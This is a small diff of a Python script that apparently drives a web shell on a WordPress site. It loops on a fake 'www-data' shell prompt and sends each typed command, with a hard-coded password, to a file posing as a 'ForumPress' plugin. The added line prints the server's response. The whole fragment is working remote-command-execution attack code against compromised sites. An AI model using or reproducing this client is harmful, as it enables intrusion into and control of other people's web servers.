@@ -8,5 +8,6 @@ def main():
 		cmd = raw_input("www-data:www-data # ")
 		target = "http://" + ask.target + "/wp-content/plugins/ForumPress/forum_press.php?passwd=qgAZ9xWxTsmGX5mgnbTHyzdf5oSbwzRhVB4LL7d29RSb4MqXRdbSWEoCvaTn&c=" + cmd
 		r = requests.post(target)
+		text(r.content)
 
 main()
